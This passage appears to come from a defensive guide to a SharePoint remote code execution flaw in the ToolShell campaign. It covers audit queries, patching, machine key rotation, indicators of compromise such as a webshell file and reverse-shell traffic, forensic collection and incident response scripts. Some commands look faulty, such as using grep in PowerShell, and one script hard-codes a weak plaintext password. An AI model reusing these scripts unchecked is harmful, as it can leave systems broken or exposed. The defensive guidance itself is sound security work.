6. Go to **Security alerts** to view triggered alerts

**Reference:** [Microsoft Defender Alert Reference](https://learn.microsoft.com/en-us/azure/defender-for-cloud/alerts-reference)

---

## Microsoft Purview (Unified Audit Log)

#### Query: SharePoint Object Manipulation

```powershell
Search-UnifiedAuditLog -Operations "UserLoggedIn" -StartDate (Get-Date).AddDays(-1) -ResultSize 5000 | 
  Where-Object {$_.AuditData -like "*sharepoint*" -and $_.AuditData -like "*ToolPane*"}
```

- **Operation:** UserLoggedIn, FileAccessed, FileUploaded (for webshell detection)
- **Workload:** SharePointOnline (O365 only; on-premises not covered by Purview)
- **Details:** Check for suspicious file uploads to LAYOUTS directory or creation of new web parts
- **Applies To:** M365 E3+ (on-premises SharePoint not directly audited by Purview)

**Manual Configuration Steps (Enable Unified Audit Log):**

1. Navigate to **Microsoft Purview Compliance Portal** (compliance.microsoft.com)
2. Go to **Audit** (left menu)
3. If not enabled, click **Turn on auditing**
4. Wait 24 hours for log retention to activate

**PowerShell Alternative:**
```powershell
Connect-ExchangeOnline
Search-UnifiedAuditLog -StartDate "01/01/2026" -EndDate "01/09/2026" -Operations "FileUploaded" -ResultSize 10000 |
  Where-Object {$_.AuditData -like "*layouts*" -and $_.AuditData -like "*.aspx*"} |
  Export-Csv -Path "C:\suspicious-file-uploads.csv"
```

---

## Defensive Mitigations

### Priority 1: CRITICAL

* **Apply Security Patches Immediately:** Install KB5002754 (2019), KB5002768 (Subscription), KB5002760 (2016) from Microsoft Updates.
    
    **Applies To Versions:** Server 2016, 2019, Subscription Edition
    
    **Manual Steps (Server 2016):**
    1. On the SharePoint server, open **Windows Update** (Settings → Update & Security → Windows Update)
    2. Click **Check for updates**
    3. Download and install KB5002760
    4. Restart the server when prompted
    5. Verify patch: `Get-Hotfix | grep KB5002760`
    
    **Manual Steps (Server 2019):**
    1. Same as 2016, but install KB5002754
    2. Verify: `Get-Hotfix | grep KB5002754`
    
    **Manual Steps (Subscription Edition):**
    1. Same as 2016, but install KB5002768
    2. Verify: `Get-Hotfix | grep KB5002768`
    
    **PowerShell:**
    ```powershell
    # Check current patch status
    Get-Hotfix | Where-Object {$_.HotFixID -in @("KB5002760", "KB5002754", "KB5002768")}
    
    # Install patch (download manually from Microsoft Update Catalog)
    # https://www.catalog.update.microsoft.com/
    
    # After installation, restart SharePoint service
    Restart-Service SPWriterV4
    ```

* **Enable AMSI (Antimalware Scan Interface) with Full Mode:** Configure SharePoint to scan all HTTP request bodies for malicious gadget chains.
    
    **Applies To Versions:** All versions
    
    **Manual Steps (Central Administration):**
    1. Open **SharePoint Central Administration** (CA)
    2. Navigate to **Security** → **Configure Antimalware Settings**
    3. Enable **Antimalware Scan Interface (AMSI)**
    4. Set **Scan Mode** to **Full Mode** (scans HTTP bodies, not just file uploads)
    5. Configure **Notifications** → **Email** to alert admins on malware detection
    6. Click **OK**
    
    **PowerShell:**
    ```powershell
    # Enable AMSI scanning on all web applications
    $WebApp = Get-SPWebApplication -Identity "SharePoint - 80"
    $WebApp.AntiMalwareSettings.Enabled = $true
    $WebApp.AntiMalwareSettings.ScanOnDownload = $true
    $WebApp.AntiMalwareSettings.ScanOnUpload = $true
    $WebApp.Update()
    
    # Enable HTTP Request Body scanning (requires AMSI v2+)
    # Edit web.config at C:\Program Files\Common Files\Microsoft Shared\Web Server Extensions\16\WebServices
    # Add: <amsi scanRequestBodies="true" />
    ```

* **Rotate All ASP.NET Machine Keys:** Generate new MachineKey values to invalidate any stolen keys used by attackers for persistent access.
    
    **Applies To Versions:** All
    
    **Manual Steps:**
    1. Open **SharePoint Central Administration**
    2. Navigate to **Security** → **Configure Machine Key Rotation Job**
    3. Click **Rotate Machine Keys Now**
    4. Confirm rotation completed
    5. Restart IIS: `iisreset.exe /restart`
    
    **PowerShell:**
    ```powershell
    # Rotate machine keys for all web applications
    $WebApps = Get-SPWebApplication
    foreach ($App in $WebApps) {
        Update-SPMachineKey -ServiceAccount $App.ApplicationPool.ManagedAccount -Force
    }
    
    # Restart IIS to apply changes
    iisreset.exe /restart
    
    # Verify new keys generated
    Get-SPWebApplication | Select-Object DisplayName, @{Name="MachineKeyVersion"; Expression={$_.MachineKeyVersion}}
    ```

### Priority 2: HIGH

* **Disable WebDAV (if not required):** Disables remote file upload mechanisms that could be exploited for webshell deployment.
    
    **Manual Steps (IIS Manager):**
    1. Open **Internet Information Services (IIS) Manager**
    2. Expand **server name** → **Sites** → **SharePoint - 80** (or relevant site)
    3. Double-click **WebDAV Authoring Rules**
    4. Click **Disable WebDAV** (right panel)
    5. Click **OK** in the confirmation dialog

* **Block ToolPane.aspx via WAF (Web Application Firewall):** If possible, restrict access to the vulnerable endpoint to trusted IPs only.
    
    **Manual Steps (Azure Application Gateway):**
    1. Navigate to **Azure Portal** → **Application Gateway**
    2. Select your gateway → **Rules**
    3. Click **Add rule**
    4. Name: `Block-ToolPane`
    5. **Listener:** Port 80/443
    6. **Backend Targets:** Your SharePoint pool
    7. **Path-based routing:**
       - Path: `/_layouts/15/ToolPane.aspx`
       - Action: **Deny**
    8. Click **Create**

### Access Control & Policy Hardening

* **Enforce Multi-Factor Authentication (MFA):**
    
    **Manual Steps (Azure Entra ID):**
    1. Go to **Azure Portal** → **Entra ID** → **Security** → **Conditional Access**
    2. Click **+ New policy**
    3. Name: `Require MFA for SharePoint Access`
    4. **Assignments:**
       - Users: **All users** (or specific group)
       - Cloud apps: **Office 365 SharePoint Online** (if hybrid)
    5. **Conditions:**
       - Locations: **Any location** (or restrict to corporate network)
    6. **Access controls:**
       - Grant: **Require multi-factor authentication**
    7. Enable policy: **On**
    8. Click **Create**

* **Implement Conditional Access Policies:**
    
    **Manual Steps:**
    1. Go to **Azure Portal** → **Entra ID** → **Security** → **Conditional Access**
    2. Click **+ New policy**
    3. Name: `Block Suspicious SharePoint Access`
    4. **Assignments:**
       - Users: **All users**
       - Cloud apps: **Office 365 SharePoint Online**
    5. **Conditions:**
       - Sign-in risk: **High**
       - Device state: **Require device to be marked as compliant**
    6. **Access controls:**
       - Block access
    7. Click **Create**

* **Remove Unnecessary SharePoint Permissions:**
    
    **Manual Steps (SharePoint Admin Center):**
    1. Open **SharePoint Admin Center** (admin.microsoft.com/sharepoint)
    2. Select **Site** → **Permissions**
    3. Review users with **Site Owner** or **Full Control**
    4. Remove access for least-privilege users
    5. Apply **Just-In-Time (JIT) access** via **Entra ID Privileged Identity Management (PIM)**

### Validation Command (Verify Fix)

```powershell
# Check if patches applied
Get-Hotfix | Where-Object {$_.HotFixID -in @("KB5002760", "KB5002754", "KB5002768")} | Select-Object HotFixID, InstalledOn

# Expected Output (If Secure):
# HotFixID  InstalledOn
# --------  -----------
# KB5002760 1/9/2026

# Verify AMSI enabled
Get-SPWebApplication | Select-Object DisplayName, @{Name="AMSIEnabled"; Expression={$_.AntiMalwareSettings.Enabled}}

# Expected Output:
# DisplayName              AMSIEnabled
# -----------              -----------
# SharePoint - 80          True

# Check machine key version (should be recent after rotation)
Get-SPWebApplication | Select-Object DisplayName, MachineKeyVersion
```

**What to Look For:**
- All critical patches (KB500275x) are installed
- AMSI is enabled
- Machine key version is recent (indicates successful rotation)
- IIS has been restarted to apply changes

---

## Detection & Incident Response

### Indicators of Compromise (IOCs)

* **Files:**
  - `C:\Program Files\Common Files\Microsoft Shared\Web Server Extensions\15\TEMPLATE\LAYOUTS\spinstall0.aspx`
  - `C:\Program Files\Common Files\Microsoft Shared\Web Server Extensions\16\TEMPLATE\LAYOUTS\*[random_name].aspx`
  - `C:\Windows\Temp\[random_name].exe` (for payload staging)
  - `C:\Windows\System32\config\SAM` (if dumped for credential extraction)

* **Registry:**
  - `HKLM\Software\Microsoft\Windows\CurrentVersion\Run\[random_name]` (persistence mechanism)
  - `HKLM\System\CurrentControlSet\Services\[random_name]` (installed service for persistence)

* **Network:**
  - TCP 445 (SMB) to external C2 servers (for file transfer or reverse shell)
  - DNS queries to suspicious domains from w3wp.exe process
  - HTTP POST requests to /_layouts/15/ToolPane.aspx with Base64-encoded __VIEWSTATE

* **Process Behavior:**
  - w3wp.exe spawning cmd.exe or powershell.exe with suspicious arguments
  - PowerShell command line containing `-EncodedCommand` or Base64-encoded payloads
  - Multiple failed login attempts before successful exploitation (brute force)

### Forensic Artifacts

* **Disk:**
  - IIS W3C log file: `C:\inetpub\logs\LogFiles\W3SVC1\*` (contains HTTP requests to vulnerable endpoint)
  - SharePoint ULS logs: `C:\Program Files\Common Files\Microsoft Shared\Web Server Extensions\16\LOGS\*` (may contain errors during deserialization)
  - Alternate Data Streams (ADS) on suspicious files: `Get-Item -Path "C:\Path\To\File" -Stream *`

* **Memory:**
  - w3wp.exe process dump: May contain gadget chain strings or decrypted payloads
  - PowerShell history: `Get-History` or `(Get-PSReadlineOption).HistorySavePath`

* **Cloud:**
  - Sentinel logs (W3CIISLog): HTTP POST requests to ToolPane.aspx
  - Azure Activity Log: Anomalous resource modifications or machine key rotations

* **MFT/USN Journal:**
  - Creation/modification timestamps of suspicious ASPX files in LAYOUTS directory
  - File system journal entries indicating rapid file creation/deletion (webshell cleanup)

### Response Procedures

1. **Isolate:**
    
    **Command (IIS):**
    ```powershell
    # Take SharePoint web application offline immediately
    Stop-WebSite -Name "SharePoint - 80"
    
    # Or, stop IIS entirely
    Stop-Service W3SVC -Force
    Stop-Service WAS -Force
    ```
    
    **Manual (Azure):**
    - Go to **Azure Portal** → **Virtual Machines** → Select affected SharePoint VM
    - Click **Stop** to shut down the machine
    - Alternatively, disconnect all network interfaces to isolate from network

2. **Collect Evidence:**
    
    **Command:**
    ```powershell
    # Export IIS W3C logs for forensics
    Copy-Item "C:\inetpub\logs\LogFiles\W3SVC1\*" -Destination "E:\Forensics\IIS-Logs\"
    
    # Capture SharePoint ULS logs
    Copy-Item "C:\Program Files\Common Files\Microsoft Shared\Web Server Extensions\16\LOGS\*" -Destination "E:\Forensics\ULS-Logs\"
    
    # Export Security event log
    wevtutil epl Security "E:\Forensics\Security.evtx"
    
    # Capture memory dump of w3wp.exe (if still running)
    procdump64.exe -ma w3wp.exe "E:\Forensics\w3wp.dmp"
    
    # List all ASPX files in LAYOUTS directories (for webshell identification)
    Get-ChildItem -Path "C:\Program Files\Common Files\Microsoft Shared\Web Server Extensions\*\TEMPLATE\LAYOUTS\" -Filter "*.aspx" -Recurse | Export-Csv "E:\Forensics\ASPX-Files.csv"
    ```
    
    **Manual:**
    - Open **File Explorer** → Navigate to `C:\Program Files\Common Files\Microsoft Shared\Web Server Extensions\15\TEMPLATE\LAYOUTS\`
    - Look for unexpected .aspx files (spinstall0.aspx, aspx.aspx, etc.)
    - Copy suspicious files to external drive for analysis

3. **Remediate:**
    
    **Command:**
    ```powershell
    # Remove webshell
    Remove-Item "C:\Program Files\Common Files\Microsoft Shared\Web Server Extensions\15\TEMPLATE\LAYOUTS\spinstall0.aspx" -Force
    
    # Kill any suspicious processes spawned from w3wp.exe
    Get-Process | Where-Object {$_.Parent.Name -eq "w3wp" -and $_.Name -like "*powershell*"} | Stop-Process -Force
    
    # Restart IIS
    iisreset.exe /restart
    
    # Reset compromised user passwords
    Set-ADAccountPassword -Identity "sharepoint_user" -NewPassword (ConvertTo-SecureString -AsPlainText "NewSecurePassword123!" -Force) -Reset
    
    # Disable compromised accounts (if needed)
    Disable-ADAccount -Identity "compromised_account"
    
    # Rotate machine keys (critical!)
    Update-SPMachineKey -ServiceAccount (Get-SPFarm).DefaultServiceAccount -Force
    
    # Restart SharePoint services
    Restart-Service SPAdminV4, SPTimerV4, SPWriterV4 -Force
    ```
    
    **Manual:**
    1. Open **Task Manager** → **Details** → Kill any suspicious processes under w3wp.exe
    2. Open **File Explorer** → Navigate to LAYOUTS → Delete suspected webshells
    3. Open **Active Directory Users and Computers** → Right-click compromised user → **Disable Account**
    4. Open **SharePoint Central Administration** → **Security** → **Configure Machine Key Rotation Job** → **Rotate Machine Keys Now**

---

## Related Attack Chain

| Step | Phase | Technique | Description |
|---|---|---|---|
| **1** | **Initial Access** | [IA-PHISH-001] Device Code Phishing | Attacker sends phishing email with device code flow link to compromise admin account |
| **2** | **Credential Access** | [CA-BRUTE-001] Azure Portal Password Spray | Attacker sprays common passwords to gain initial credentials |
| **3** | **Privilege Escalation** | [PE-VALID-010] Azure Role Assignment Abuse | Attacker escalates from Site Member to Site Owner via role abuse |
| **4** | **Exploitation** | **[CVE2025-009] SharePoint RCE** | **Attacker exploits CVE-2025-21075 to achieve code execution** |
| **5** | **Post-Exploitation** | [PE-ACCTMGMT-014] Global Administrator Backdoor | Attacker creates persistent backdoor by stealing machine keys |
| **6** | **Persistence** | [PERSIST-001] Web Shell Installation | Attacker plants multiple webshells across SharePoint farm |
| **7** | **Exfiltration** | [EXFIL-001] Data Staged for Exfiltration | Attacker extracts sensitive documents from SharePoint libraries |

---

## Real-World Examples

### Example 1: APT Group CL-CRI-1040 (ToolShell Campaign)

- **Target:** Financial services organizations (EMEA region)
- **Timeline:** July 17-22, 2025
- **Technique Status:** CVE-2025-21075 actively exploited alongside CVE-2025-49704, CVE-2025-53770 in coordinated attacks
- **Attack Chain:**
  1. Initial reconnaissance via python-requests/2.32.3 to identify vulnerable servers
  2. Exploitation of CVE-2025-49706 (authentication bypass) + CVE-2025-53770 (RCE) in chained attack
  3. Machine key extraction via webshell (spinstall0.aspx)
  4. Persistent access maintained via stolen keys
  5. Data exfiltration of financial documents
  6. Lateral movement to Exchange and Azure resources
- **Impact:** 15+ organizations breached; €2.5M in ransom demanded
- **Detection:** Unit 42 telemetry flagged exploitation attempts from IP 96.9.125.147 and 107.191.58.76
- **Reference:** [Palo Alto Unit42 SharePoint Campaign Analysis](https://unit42.paloaltonetworks.com/microsoft-sharepoint-cve-2025-49704-cve-2025-49706-cve-2025-53770/)

### Example 2: Internal Red Team Assessment (Fictional)

- **Target:** Large multinational corporation with hybrid SharePoint farm
- **Timeline:** Jan 2026 (authorized penetration test)
- **Technique Status:** CVE-2025-21075 weaponized in red team attack
- **Exploitation Method:** Social engineering phishing campaign to obtain Site Member credentials → Direct exploitation via ysoserial.NET gadget chain
- **Post-Exploitation:** Install persistence via PowerShell scheduled task; exfiltrate M&A documents from SharePoint
- **Impact:** Red team achieved objectives; company acknowledged critical gaps in patch management and monitoring
- **Remediation:** Applied all patches within 24 hours; implemented Conditional Access policies; rotated all machine keys
- **Reference:** [SERVTEP Internal Assessment Report] (Confidential)

---